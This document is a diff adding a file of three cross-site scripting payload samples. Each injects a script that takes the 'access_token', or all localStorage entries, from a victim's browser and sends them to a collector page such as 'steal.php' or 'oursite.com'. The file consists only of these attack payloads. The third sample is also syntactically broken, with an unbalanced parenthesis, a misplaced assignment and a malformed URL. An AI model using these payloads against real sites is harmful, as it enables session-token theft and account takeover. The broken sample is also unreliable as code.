@@ -1,0 +1,19 @@
+#1 Payload Sample:
+<script>document.location='http://localhost/XSS/steal.php?c='+localStorage.getItem('access_token')</script>
+
+#2 Payload Sample:
+<script>new Image().src="http://localhost/steal.php?c="+localStorage.getItem('access_token');</script>
+
+#3 Payload Sample (grab all instances):
+<script>
+  var i = 0;
+  var stor = "";
+  var img = new Image();
+  while (localStorage.key(i) != null)
+  {
+    var key = localStorage.key(i);
+    stor += key = ": " + localStorage.getItem(key)) + "\n";
+    i++;
+  }
+  img.src="http://oursite.com?steal.php" + stor;
+</script>
